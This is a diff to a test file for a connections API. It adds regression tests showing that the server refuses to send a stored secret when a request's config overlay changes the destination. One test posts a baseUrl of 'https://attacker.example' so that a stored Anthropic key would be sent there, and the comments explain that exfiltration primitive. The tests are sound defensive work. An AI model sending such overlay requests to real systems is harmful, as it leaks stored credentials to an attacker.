@@ -362,7 +362,7 @@ describe('connections routes', () => {
       expect(overlaid.json().error).toMatch(/not accessible/);
     });
 
-    it('REFUSES to spend the stored secret on a destination the saved row does not name', async () => {
+    it('REFUSES to spend the stored secret on a destination the saved row does not name (postgres)', async () => {
       // The exfiltration primitive this rule exists to close: overlay a host,
       // omit the secret, and the server would decrypt the stored password and
       // send it wherever the body said. `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS`
@@ -384,8 +384,81 @@ describe('connections routes', () => {
         },
       });
       expect(res.json()).toMatchObject({ ok: false });
-      expect(res.json().error).toMatch(/would send the stored secret somewhere/);
+      expect(res.json().error).toMatch(/would spend the stored secret/);
       expect(res.json().error).toContain('host');
+    });
+
+    it('REFUSES an API-key kind whose baseUrl the overlay moved — the hole an allowlist left open', async () => {
+      // THE REGRESSION TEST. `anthropic_api` sends the stored key to
+      // `config.baseUrl` as an `x-api-key` header (`anthropic.ts`), and its
+      // entry in `CONNECTION_NON_OVERRIDABLE_CONFIG_KEYS` is EMPTY — so the
+      // first version of this guard, which consulted that table, permitted
+      // exactly this request. `openai_api` and `http` are the same shape.
+      // Nothing about postgres would have caught it: the kinds whose credential
+      // is easiest to spend were the ones the allowlist did not cover.
+      const created = await app.inject({
+        method: 'POST',
+        url: '/api/connections',
+        payload: {
+          name: 'anthropic exfil',
+          kind: 'anthropic_api',
+          config: { baseUrl: 'https://api.anthropic.com' },
+          secret: 'sk-ant-stored',
+        },
+      });
+      const res = await app.inject({
+        method: 'POST',
+        url: `/api/connections/${created.json().id}/test`,
+        payload: { config: { baseUrl: 'https://attacker.example' } },
+      });
+      expect(res.json()).toMatchObject({ ok: false });
+      expect(res.json().error).toMatch(/would spend the stored secret/);
+      expect(res.json().error).toContain('baseUrl');
+      // And the key itself never travelled — not to the attacker, not back here.
+      expect(res.body).not.toContain('sk-ant-stored');
+    });
+
+    it('REFUSES a harmless-looking change too — the rule is the whole config', async () => {
+      // `model` moves no destination, and an allowlist would wave it through.
+      // The rule is deliberately total anyway: enumerating which keys are
+      // dangerous is a standing bet about every adapter's future, and it fails
+      // OPEN. The operator loses nothing they cannot recover by saving first or
+      // typing the secret, and the sentence says both.
+      const created = await app.inject({
+        method: 'POST',
+        url: '/api/connections',
+        payload: {
+          name: 'anthropic model edit',
+          kind: 'anthropic_api',
+          config: { baseUrl: 'https://api.anthropic.com', model: 'claude-opus-4-8' },
+          secret: 'sk-ant-stored',
+        },
+      });
+      const res = await app.inject({
+        method: 'POST',
+        url: `/api/connections/${created.json().id}/test`,
+        payload: {
+          config: { baseUrl: 'https://api.anthropic.com', model: 'claude-sonnet-4-5' },
+        },
+      });
+      expect(res.json().error).toMatch(/would spend the stored secret/);
+      expect(res.json().error).toContain('model');
+    });
+
+    it('allows an UNCHANGED overlay — an edit-form probe that touched nothing', async () => {
+      // The form sends its whole config on every Test, so the ordinary
+      // "open Edit, press Test" path posts an overlay identical to the stored
+      // row. That must reach the adapter, or the button would be refused far
+      // more often than it works.
+      const id = await seedPostgres('stored-pw');
+      const res = await app.inject({
+        method: 'POST',
+        url: `/api/connections/${id}/test`,
+        payload: {
+          config: { host: '127.0.0.1', port: 1, database: 'app', user: 'app', sslmode: 'disable' },
+        },
+      });
+      expect(res.json().error).not.toMatch(/would spend the stored secret/);
     });
 
     it('allows the same overlay when the body brings its OWN secret', async () => {
@@ -409,7 +482,7 @@ describe('connections routes', () => {
           secret: 'typed-in-the-form',
         },
       });
-      expect(res.json().error).not.toMatch(/would send the stored secret somewhere/);
+      expect(res.json().error).not.toMatch(/would spend the stored secret/);
     });
 
     it('allows a boundary-key overlay on a connection that holds NO secret', async () => {
